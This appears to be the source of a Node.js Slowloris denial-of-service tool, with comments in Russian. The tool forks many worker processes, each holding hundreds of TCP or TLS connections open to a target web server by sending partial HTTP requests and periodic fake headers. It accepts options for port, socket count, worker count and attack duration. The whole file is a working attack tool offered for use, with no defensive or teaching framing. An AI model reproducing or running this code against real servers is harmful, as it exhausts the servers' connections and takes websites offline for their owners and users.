const { Signale } = require("signale");
const program = require("commander");
const pkg = require("../package.json");
const URL = require("url");
const tls = require("tls");
const net = require("net");
const colors = require("colors");
const { fork } = require("child_process");

const IS_WORKER = !!process.env.SLOWLORIS_WORKER;

IS_WORKER ? runWorker() : runOrchestrator();

// ─── Worker: отдельный OS-процесс, свой ulimit -n ────────────────────────────

function runWorker() {
    const port = parseInt(process.env.SLOWLORIS_PORT);
    const sockets = parseInt(process.env.SLOWLORIS_SOCKETS);
    const host = process.env.SLOWLORIS_HOST;
    const connectionModule = process.env.SLOWLORIS_HTTPS === '1' ? tls : net;
    const options = { port, host };
    let connected = 0;

    function createSocket() {
        const socket = connectionModule.connect(options, () => {
            connected++;
            process.send({ type: 'connected' });

            socket.write("GET / HTTP/1.1\r\n");
            socket.write(`Host: ${host}\r\n`);
            socket.write("Accept: */*\r\n");
            socket.write(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
            );

            setInterval(() => {
                socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
            }, 500);
        });

        socket.setTimeout(0);
        socket.on("error", () => { socket.destroy(); createSocket(); });
    }

    for (let i = 0; i < sockets; i++) createSocket();

    setTimeout(() => { if (connected === 0) process.exit(1); }, 10000);
}

// ─── Orchestrator: запускает N дочерних процессов, агрегирует вывод ──────────

function runOrchestrator() {
    const interactive = new Signale({
        interactive: true,
        stream: process.stderr,
        types: { error: { color: "red", label: "Error" } }
    });

    program
        .version(pkg.version)
        .usage("[options] <url>")
        .option("-p, --port <n>", "The port of the webserver (default: 80)")
        .option("-s, --sockets <n>", "Number of sockets per worker process (default: 200)")
        .option("-i, --instances <n>", "Number of parallel worker processes (default: 20)")
        .option("-t, --time <n>", "Duration of the attack in milliseconds")
        .parse(process.argv);

    if (program.args.length == 0) {
        interactive.error(colors.red("please provide a URL"));
        program.outputHelp();
        process.exit(-1);
    }

    const url = program.args[0];
    if (!(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/.test(url))) {
        interactive.error(colors.red("The URL is not valid, please follow the format: \n http://example.com"));
        process.exit(-1);
    }

    const socketsPerWorker = parseInt(program.sockets) || 200;
    const instanceCount = parseInt(program.instances) || 20;
    const totalSockets = socketsPerWorker * instanceCount;
    const parsedUrl = URL.parse(url);
    const useHttps = parsedUrl.protocol === 'https:';
    const port = program.port ? parseInt(program.port) : (useHttps ? 443 : 80);

    if (program.time) {
        setTimeout(() => {
            interactive.success("Attack completed!");
            process.exit(0);
        }, parseInt(program.time));
    }

    const workerEnv = {
        ...process.env,
        SLOWLORIS_WORKER: '1',
        SLOWLORIS_HOST: parsedUrl.host,
        SLOWLORIS_PORT: String(port),
        SLOWLORIS_SOCKETS: String(socketsPerWorker),
        SLOWLORIS_HTTPS: useHttps ? '1' : '0',
    };

    let displayProgress = 0;
    let anyConnected = false;
    let lastDisplayAt = 0;

    const noConnTimeout = setTimeout(() => {
        interactive.error(colors.red(`Could not connect to ${parsedUrl.host}:${port}`));
        process.exit(1);
    }, 10000);

    function onWorkerMessage(msg) {
        if (msg.type !== 'connected') return;

        if (!anyConnected) {
            anyConnected = true;
            clearTimeout(noConnTimeout);
        }

        displayProgress++;
        const now = Date.now();
        if (now - lastDisplayAt >= 50) {
            lastDisplayAt = now;
            const pct = Math.floor((displayProgress % totalSockets) / totalSockets * 100);
            interactive.await("Creating %d sockets ... %d%", totalSockets, pct);
        }
    }

    function spawnWorker() {
        const worker = fork(__filename, [], { env: workerEnv, silent: true });
        worker.on('message', onWorkerMessage);
        worker.on('exit', (code) => { if (code !== 0) spawnWorker(); });
    }

    for (let i = 0; i < instanceCount; i++) spawnWorker();
}
